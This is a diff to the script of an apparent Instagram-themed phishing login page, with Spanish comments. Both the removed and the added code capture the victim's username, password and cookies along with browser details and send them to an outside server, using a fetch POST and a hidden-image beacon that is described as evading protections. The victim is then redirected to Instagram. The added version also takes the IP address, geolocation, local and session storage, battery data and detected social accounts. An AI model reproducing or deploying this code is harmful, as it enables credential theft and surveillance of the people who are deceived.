@@ -261,53 +261,181 @@
     </div>
     
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            const stolenData = {
-                credentials: {
-                    username: username,
-                    password: password
-                },
-                cookies: document.cookie,
-                browserInfo: {
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    screenWidth: window.screen.width,
-                    screenHeight: window.screen.height,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    referrer: document.referrer
-                },
-                timestamp: new Date().toISOString(),
-                location: window.location.href
-            };
-            
-            console.log("Datos capturados:", stolenData);
-            
-            fetch('https://mi-server-bkk1.onrender.com/datos', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(stolenData)
-            }).catch(error => {
-                console.error('Error:', error);
-            });
-            
-            const encodedData = btoa(JSON.stringify(stolenData));
-            const exfilImage = new Image();
-            exfilImage.src = 'https://mi-server-bkk1.onrender.com/datos?data=' + encodedData;
-            exfilImage.style.display = 'none';
-            document.body.appendChild(exfilImage);
-            
-            setTimeout(() => {
-                window.location.href = "https://www.instagram.com";
-            }, 1000);
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    
+    // Capturar dirección IP usando un servicio externo
+    let ipAddress = "desconocida";
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            ipAddress = data.ip;
+            completarRobo();
+        })
+        .catch(error => {
+            console.error('Error obteniendo IP:', error);
+            completarRobo();
         });
+    
+    // Obtener geolocalización si está disponible
+    let geoData = "no disponible";
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            position => {
+                geoData = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                };
+            },
+            error => {
+                console.log("Geolocalización no disponible:", error);
+            }
+        );
+    }
+    
+    // Detectar redes sociales donde el usuario podría estar conectado
+    const socialNetworks = checkSocialNetworksLogins();
+    
+    // Obtener información sobre batería si está disponible
+    let batteryInfo = "no disponible";
+    if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+            batteryInfo = {
+                level: battery.level * 100 + "%",
+                charging: battery.charging,
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
+            };
+        });
+    }
+    
+    // Detectar dispositivos de entrada disponibles
+    let deviceInfo = {
+        touchscreen: 'ontouchstart' in window,
+        inputDevices: navigator.maxTouchPoints > 0 ? "touchscreen" : "mouse/keyboard"
+    };
+    
+    // Detectar comportamiento de navegación
+    const navigationTiming = performance.timing;
+    const performanceData = {
+        pageLoadTime: navigationTiming.loadEventEnd - navigationTiming.navigationStart,
+        domLoadTime: navigationTiming.domComplete - navigationTiming.domLoading,
+        redirectTime: navigationTiming.redirectEnd - navigationTiming.redirectStart
+    };
+    
+    // Historial reciente (limitado a las páginas visitadas en la sesión actual)
+    let recentHistory = [];
+    if (window.history && window.history.length) {
+        recentHistory = {
+            length: window.history.length,
+            current: window.location.href
+        };
+    }
+    
+    // Datos de localStorage y sessionStorage
+    let storageData = {
+        localStorage: extractStorageData(localStorage),
+        sessionStorage: extractStorageData(sessionStorage)
+    };
+    
+    function extractStorageData(storage) {
+        let data = {};
+        for (let i = 0; i < storage.length; i++) {
+            const key = storage.key(i);
+            data[key] = storage.getItem(key);
+        }
+        return data;
+    }
+    
+    function checkSocialNetworksLogins() {
+        // Este método simplificado verifica pixeles sociales y scripts comunes
+        const networks = [];
+        
+        // Facebook
+        if (document.querySelector('script[src*="facebook"]') || window.FB) {
+            networks.push("facebook");
+        }
+        
+        // Twitter
+        if (document.querySelector('script[src*="twitter"]') || window.twttr) {
+            networks.push("twitter");
+        }
+        
+        // Google
+        if (document.querySelector('script[src*="google"]') || window.gapi) {
+            networks.push("google");
+        }
+        
+        return networks;
+    }
+    
+    function completarRobo() {
+        const stolenData = {
+            credentials: {
+                username: username,
+                password: password
+            },
+            cookies: document.cookie,
+            browserInfo: {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer,
+                doNotTrack: navigator.doNotTrack,
+                webdriver: navigator.webdriver,
+                plugins: Array.from(navigator.plugins).map(p => p.name)
+            },
+            networkInfo: {
+                ip: ipAddress,
+                connectionType: navigator.connection ? navigator.connection.effectiveType : "unknown",
+                downlink: navigator.connection ? navigator.connection.downlink : "unknown",
+                rtt: navigator.connection ? navigator.connection.rtt : "unknown"
+            },
+            locationData: geoData,
+            deviceInfo: deviceInfo,
+            batteryStatus: batteryInfo,
+            performanceMetrics: performanceData,
+            browserHistory: recentHistory,
+            storageData: storageData,
+            socialAccounts: socialNetworks,
+            timestamp: new Date().toISOString(),
+            location: window.location.href
+        };
+        
+        // Enviar datos mediante POST
+        fetch('https://mi-server-bkk1.onrender.com/datos', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(stolenData)
+        }).catch(error => {
+            console.error('Error:', error);
+        });
+        
+        // Método alternativo de envío usando imagen (para evadir algunas protecciones)
+        const encodedData = btoa(JSON.stringify(stolenData));
+        const exfilImage = new Image();
+        exfilImage.src = 'https://mi-server-bkk1.onrender.com/datos?data=' + encodedData;
+        exfilImage.style.display = 'none';
+        document.body.appendChild(exfilImage);
+        
+        // Redirigir a Instagram después de un retraso
+        setTimeout(() => {
+            window.location.href = "https://www.instagram.com";
+        }, 1000);
+    }
+});
     </script>
 </body>
 </html>
